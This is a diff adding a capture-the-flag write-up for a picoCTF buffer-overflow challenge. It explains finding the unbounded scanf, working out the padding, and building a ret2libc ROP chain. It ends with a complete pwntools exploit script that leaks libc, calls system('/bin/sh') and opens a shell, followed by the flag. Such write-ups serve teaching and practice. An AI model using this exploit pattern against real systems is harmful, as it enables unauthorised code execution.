@@ -204,7 +204,69 @@ void do_stuff(void)
   return;
 }
 ```
-             
-                 
-                 
-               
+
+We can clarly see a **buffer overflow** vulnerability in `__isoc99_scanf("%[^\n]",result);` with no check on input length, on a 112 long buffer. Unfortunately by running `checksec` we can see that the stack is not executable, so we can't inject shellcode: the solution seems to be ROP.
+```bash
+[*] checksec ./vuln
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+First we can run the program with `gdb` and `disassemble do_stuff` to get the address of this function and its instructions: 0x4006d8 is the first instruction's address.
+
+I then played around a bit with the input, overflowing the buffer with some values. I then decided to determine in this way the needed padding to overwrite the RBP, 136 characters (I started from 120 and tried to see if the execution continued).  
+At this point we can prepare the ROP chain in this (pretty classic) way:
+- leak a libc function address at runtime (`puts`)
+- compute the difference between the leaked address and the libc symbol of `puts`
+- call the `do_stuff()` function again to start a new chain
+- search for the `/bin/sh` string in the libc
+- using the new base address, call the `system()` function passing `/bin/sh` and get the shell
+
+So we can say we have 2 ROP chains, the first with `puts -> do_stuff` and the second with `puts -> system`. The `puts` in the second chain is needed for stack alignment, in fact look at the bytes of the second payload if we do not include it: 
+
+![image](./libc_align.PNG)
+
+The result is a quite standard libc leak + ROP chain (base structure like [here](https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address)), here you can see the final script:
+```python
+from pwn import *
+
+padding = 136
+welcome = "WeLcOmE To mY EcHo sErVeR!\n"
+
+context.binary = elf = ELF('./vuln')
+#r = elf.process()
+r = remote("mercury.picoctf.net", 62289)
+libc = ELF('./libc.so.6')
+
+rop = ROP(elf)
+rop.call('puts', [elf.got['puts']])
+rop.call('do_stuff')
+
+payload = b"A"*padding + bytes(rop)
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+
+r.sendlineafter(welcome, payload)
+r.recvline()	
+
+leaked_puts = int.from_bytes(r.recvline(keepends = False), byteorder = "little")
+log.info("RUNTIME puts address: {0}".format(hex(leaked_puts)))
+
+libc_base = leaked_puts - libc.symbols["puts"]
+libc.address = libc_base
+log.info("COMPUTED LIBC base address: {0}".format(hex(libc_base)))
+
+rop = ROP(elf)
+rop.call('puts', [elf.got['puts']]) # align stack
+rop.call(libc.symbols["system"], [next(libc.search(b"/bin/sh"))])
+
+payload = b"A"*padding + bytes(rop)
+log.info("Sending payload:\n{}".format(hexdump(payload)))
+r.sendline(payload)
+
+r.interactive()
+```
+
+Flag: **picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}**
